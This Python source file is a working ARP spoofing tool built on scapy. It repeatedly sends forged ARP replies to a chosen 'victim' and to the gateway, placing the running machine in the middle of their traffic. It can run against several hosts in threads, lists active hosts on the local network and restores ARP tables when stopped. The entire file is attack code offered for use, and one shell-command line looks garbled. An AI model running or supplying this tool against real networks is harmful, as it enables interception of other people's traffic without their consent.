import contextlib
from scapy.all import *
import time
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send
from threading import Thread


class ARPSpoofing:
    def __init__(self):
        """
        the object constructor.
        """
        self.mac = "ff:ff:ff:ff:ff:ff"
        self.hosts = {}

    def get_mac(self, ip: str) -> str:
        """
        this function makes an arp request (who-has) in the network to acquire the mac address of a given ip address.
        :param ip: the ip address of the requested host as a string.
        :return: the mac address of the given ip address (arp answer).
        """
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst=self.mac)
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(self, target_ip: str, spoof_ip: str) -> None:
        """
        this function makes a spoofed arp packet and sends it to the victim to make him think that the answer
        for the arp request (he didn't make) has been answered by spoof_ip so this computer becomes the gateway
        because he was the massager.
        :param target_ip: a string containing the ip of the target.
        :param spoof_ip: the ip of the fake answerer for the fake arp answer as a string.
        :return: nothing.
        """
        pkt = ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip),
                  psrc=spoof_ip)
        send(pkt, verbose=False)

    def restore(self, destination_ip: str, source_ip: str) -> None:
        """
        this function restore the "damage" that was made by this computer (restore the gateway to not be this computer).
        :param destination_ip: a string containing the ip of the arp packet destination.
        :param source_ip: a string containing the ip of the arp packet source.
        :return: nothing.
        """
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        pkt = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(pkt, verbose=False)

    def process(self, target_ip: str) -> None:
        """
        this function execute the full attack.
        :param target_ip: the ip of the victim in a string.
        :return: nothing.
        """
        gateway_ip = self.get_gateway_ip_address()
        with contextlib.suppress(Exception):
            sent_packets_count = 0
            while self.hosts[target_ip][0]:
                self.spoof(target_ip, gateway_ip)
                self.spoof(gateway_ip, target_ip)
                sent_packets_count += 2
                print(f"\r[*] Packets Sent - {sent_packets_count} ({target_ip})", end="")
                time.sleep(2)
        with contextlib.suppress(Exception):
            self.restore(gateway_ip, target_ip)
            self.restore(target_ip, gateway_ip)
        print(f"\n[+] Arp Spoof Stopped - {target_ip}")

    def add_host(self, ip: str) -> None:
        """
        this function add a new host for multiple attacks.
        :param ip: the ip of the victim.
        :return: nothing.
        """
        self.hosts[ip] = [True, Thread(target=self.process, args=(ip,))]

    def start_host(self, ip: str) -> None:
        """
        this function starts the attack on a given host.
        :param ip: the ip of the victim.
        :return: nothing.
        """
        self.hosts[ip][0] = True
        self.hosts[ip][1].daemon = True
        self.hosts[ip][1].start()

    def stop_host(self, ip: str) -> None:
        """
        this function stops the attack on a given host.
        :param ip: the ip of the victim.
        :return: nothing.
        """
        self.hosts[ip][0] = False

    @staticmethod
    def get_gateway_ip_address() -> str:
        """
        this function returns the ip address of the gateway
        :return: the ip address of the gateway
        """
        return subprocess.Popen(["route -n get default | grep 'gateway' | awk '{print $2}'"],
                                stdout=subprocess.PIPE,
                                shell=True).stdout.read().decode().replace("\n", "")

    @staticmethod
    def get_hosts() -> list:
        """
        this function lists all the active hosts in the current network.
        :return: list of ip addresses.
        """
        return re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', subprocess.Popen(["arp -a -n"],
                                                                                  stdout=subprocess.PIPE,
                                                                                  shell=True).stdout.read().decode())


def get_subnet_mask() -> str:
    """
    this function return the subnet mask of the current network.
    :return: the subnet mask as an ip.
    """
    return subprocess.Popen(["ifconfig -a| grep -w in et|awk '{print $6}'"],
                            stdout=subprocess.PIPE,
                            shell=True).stdout.read().decode().replace("\n", "").replace("255", "0")


def main() -> None:
    target_ip = "192.168.1.1"
    spoofer = ARPSpoofing()
    spoofer.add_host(target_ip)
    spoofer.start_host(target_ip)
    spoofer.stop_host(target_ip)


if __name__ == "__main__":
    main()
